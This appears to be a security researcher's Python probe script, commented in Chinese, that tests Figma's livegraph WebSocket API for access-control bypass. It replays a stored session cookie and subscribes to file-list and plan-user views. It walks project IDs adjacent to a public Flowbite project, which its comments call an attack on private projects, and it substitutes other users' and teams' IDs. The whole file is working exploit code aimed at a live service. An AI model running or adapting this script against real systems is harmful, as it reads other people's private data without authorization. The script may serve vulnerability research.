# -*- coding: utf-8 -*-
"""对照判定: 项目级分页 view 是否越权 (PaginatedFilesByProjectView 根 filter 无 userId 绑定)
目标: B 身份读 Flowbite 团队(非成员)的私有项目文件清单
实验A: PaginatedFilesByProjectView — Flowbite公开项目(阳性) vs 同团队项目(阳性) vs Flowbite相邻ID(攻击) vs 不存在ID(空壳)
实验B: PaginatedFilesByProjectAndEditorTypeView — 同上 (editorType 0/1)
实验C: PlanUserByTeamIdAndUserId — userId 参数透传 (非 dZ 当前用户)
"""
import sys, json, io, asyncio, time, urllib.parse, uuid
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_TEAM = "1666382706663462213"
FB_TEAM = "947922137358580288"
FB_PROJ = "76349165"       # Flowbite 公开文件项目
A_PROJ = "634606970"       # 同团队项目 (B 合法可见)
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)

OUT = io.open("_ws_project_probe_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, uid, ck, wait=9):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": ck,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


async def run_case(label, view, args, uid, ck, fk=A_MAKE):
    frames = await sub(view, args, fk, uid, ck, wait=8)
    txt = " ".join(frames)
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    m = re_search_status(txt)
    if has_data:
        tag = "⭐返回数据"
    elif m:
        tag = f"⚠{m}"
    elif any("argument error" in f or "Missing argument" in f for f in frames):
        tag = "⚠参数错误"
    elif any("error" in f.lower() for f in frames):
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag} 帧数={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:2000]}\n")
        if has_data:
            print(f"  🖼 {f[:1200]}")


def re_search_status(txt):
    import re
    m = re.search(r'Status code = (\d+). Error message = .*?"message":"([^"]*)"', txt)
    return f"{m.group(1)} {m.group(2)[:50]}" if m else None


async def main():
    # ============ 实验A: PaginatedFilesByProjectView ============
    print("=== 实验A: PaginatedFilesByProjectView (B身份) ===")
    await run_case("A1 Flowbite公开项目", "PaginatedFilesByProjectView",
                   {"projectId": FB_PROJ, "firstPageSize": 20, "sortColumn": "updatedAt",
                    "sortType": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)
    await run_case("A2 同团队项目(合法)", "PaginatedFilesByProjectView",
                   {"projectId": A_PROJ, "firstPageSize": 20, "sortColumn": "updatedAt",
                    "sortType": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)
    # Flowbite 相邻项目 ID 采样 (攻击: 私有项目)
    for pid in ["76349160", "76349162", "76349163", "76349164", "76349166", "76349167", "76349168", "76349170"]:
        await run_case(f"A3 相邻ID {pid}", "PaginatedFilesByProjectView",
                       {"projectId": pid, "firstPageSize": 20, "sortColumn": "updatedAt",
                        "sortType": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.25)
    await run_case("A4 不存在ID", "PaginatedFilesByProjectView",
                   {"projectId": "999999999999", "firstPageSize": 20, "sortColumn": "updatedAt",
                    "sortType": "DESC", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)

    # ============ 实验B: PaginatedFilesByProjectAndEditorTypeView ============
    print("\n=== 实验B: PaginatedFilesByProjectAndEditorTypeView (editorType 0/1) ===")
    for et in ["0", "1"]:
        await run_case(f"B1 Flowbite公开 et={et}", "PaginatedFilesByProjectAndEditorTypeView",
                       {"projectId": FB_PROJ, "editorType": et, "firstPageSize": 20,
                        "sortColumn": "updatedAt", "sortType": "DESC",
                        "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.3)
        await run_case(f"B2 相邻ID 76349164 et={et}", "PaginatedFilesByProjectAndEditorTypeView",
                       {"projectId": "76349164", "editorType": et, "firstPageSize": 20,
                        "sortColumn": "updatedAt", "sortType": "DESC",
                        "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.3)

    # ============ 实验C: PlanUserByTeamIdAndUserId ============
    print("\n=== 实验C: PlanUserByTeamIdAndUserId (userId 参数透传) ===")
    await run_case("C1 基线 自己团队+自己uid", "PlanUserByTeamIdAndUserId",
                   {"teamId": A_TEAM, "userId": B_UID, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)
    await run_case("C2 同团队+他人uid(A)", "PlanUserByTeamIdAndUserId",
                   {"teamId": A_TEAM, "userId": A_UID, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)
    await run_case("C3 越权候选 Flowbite+A", "PlanUserByTeamIdAndUserId",
                   {"teamId": FB_TEAM, "userId": A_UID, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)
    await run_case("C4 越权候选 Flowbite+B", "PlanUserByTeamIdAndUserId",
                   {"teamId": FB_TEAM, "userId": B_UID, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)
    await run_case("C5 不存在uid", "PlanUserByTeamIdAndUserId",
                   {"teamId": A_TEAM, "userId": "999999999999", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.3)

    OUT.close()
    print("\nDONE")


asyncio.run(main())
